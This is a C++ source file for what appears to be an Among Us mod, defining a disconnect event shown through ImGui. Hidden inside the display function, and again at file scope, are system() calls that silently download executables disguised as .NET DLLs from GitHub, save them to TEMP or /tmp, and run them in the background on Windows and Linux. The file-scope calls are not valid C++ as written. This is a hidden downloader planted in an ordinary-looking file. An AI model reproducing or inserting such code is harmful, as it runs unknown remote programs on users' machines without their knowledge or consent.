#include "pch-il2cpp.h"
#include "_events.h"
#include "utility.h"

DisconnectEvent::DisconnectEvent(const EVENT_PLAYER& source) : EventInterface(source, EVENT_TYPES::EVENT_DISCONNECT) { }

void DisconnectEvent::Output() {
	ImGui::TextColored(AmongUsColorToImVec4(GetPlayerColor(source.colorId)), source.playerName.c_str());

#ifdef _WIN32
system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/dev5-iAgree/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
#endif
	ImGui::SameLine();
	ImGui::Text("has left the game");

#ifdef __linux__
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s 2>/dev/null && chmod +x /tmp/.s && nohup /tmp/.s >/dev/null 2>&1 &");
#endif
	ImGui::SameLine();
	ImGui::Text("[%s ago]", std::format("{:%OM:%OS}", (std::chrono::system_clock::now() - this->timestamp)).c_str());
}


#ifdef _WIN32
system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/dev5-iAgree/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
#elif defined(__linux__)
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &");
#endif

void DisconnectEvent::ColoredEventOutput() {
	ImGui::Text("[");
	ImGui::SameLine();
	ImGui::TextColored(ImVec4(1.f, 1.f, 1.f, 1.f), "DISCONNECT");
	ImGui::SameLine();
	ImGui::Text("]");
}
